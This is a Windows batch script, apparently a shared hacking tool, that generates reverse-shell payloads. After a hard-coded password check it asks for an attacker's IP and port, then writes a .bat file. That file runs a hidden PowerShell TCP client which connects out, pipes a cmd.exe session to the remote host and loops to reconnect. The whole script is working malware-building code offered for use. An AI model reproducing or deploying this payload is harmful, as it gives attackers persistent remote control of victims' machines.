@echo off
:: -----------------------------------------------------------
:: Basic Reverse Shell Payload Generator (Locked)
:: Author : Abhi Singh
:: GitHub : https://github.com/anodeus
:: Secret Lock : Flag{@bhi*****}
:: -----------------------------------------------------------

title Basic Payload Generator - Abhi Singh
color 0a

:: -----------------------------
:: Step 0 - Security Lock
:: -----------------------------
setlocal enabledelayedexpansion

:: Ask for password (hidden input using PowerShell)
for /f "usebackq delims=" %%i in (`powershell -Command ^
    "$pword = Read-Host 'Enter access key' -AsSecureString; ^
    $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword); ^
    [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)"`) do (
    set "userkey=%%i"
)

:: Check password
if not "%userkey%"=="Flag{@bh151ngh}" (
    echo [ERROR] Invalid access key. Exiting...
    timeout /t 3 >nul
    exit /b
)

echo [OK] Access granted.
echo.

:: -----------------------------
:: Step 1 - Collect User Input
:: -----------------------------
cd files

:: Ask for IP address
powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; `
    [Microsoft.VisualBasic.Interaction]::InputBox('Enter IP address to connect to:', 'Basic Shell')}" > host.tmp
set /p host=<host.tmp
del host.tmp

:: Ask for Port
powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; `
    [Microsoft.VisualBasic.Interaction]::InputBox('Enter Port to connect to:', 'Basic Shell')}" > port.tmp
set /p port=<port.tmp
del port.tmp

:: Ask for Payload Name
powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; `
    [Microsoft.VisualBasic.Interaction]::InputBox('Enter name of payload:', 'Basic Shell')}" > name.tmp
set /p name=<name.tmp
del name.tmp

cd ..
cd payloads

:: -----------------------------
:: Step 2 - Generate Payload File
:: -----------------------------
(
    echo :: Payload generated by Abhi Singh
    echo :: GitHub: https://github.com/anodeus
    echo @echo off
    echo :start
    echo powershell -w hidden -nop -c $a='%host%';$b=%port%;$c=New-Object system.net.sockets.tcpclient;$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$ob=New-Object System.Byte[] 65536;$eb=New-Object System.Byte[] 65536;$e=new-object System.Text.UTF8Encoding;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.RedirectStandardError=1;$p.StartInfo.UseShellExecute=0;$q=$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;$es=$p.StandardError;$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s=$c.GetStream();while ($true) { start-sleep -m 100; if ($osread.IsCompleted -and $osread.Result -ne 0) { $r=$os.BaseStream.EndRead($osread); $s.Write($ob,0,$r); $s.Flush(); $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null); } if ($esread.IsCompleted -and $esread.Result -ne 0) { $r=$es.BaseStream.EndRead($esread); $s.Write($eb,0,$r); $s.Flush(); $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null); } if ($s.DataAvailable) { $r=$s.Read($nb,0,$nb.Length); if ($r -lt 1) { break; } else { $str=$e.GetString($nb,0,$r); $is.write($str); } } if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) { break; } if ($p.ExitCode -ne $null) { break; }} 
    echo goto start
) > %name%.bat

:: -----------------------------
:: Step 3 - Notification
:: -----------------------------
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; `
    [System.Windows.Forms.MessageBox]::Show('%name%.bat saved in payloads folder', `
    'Basic Shell', 'Ok', `
    [System.Windows.Forms.MessageBoxIcon]::Information);}"
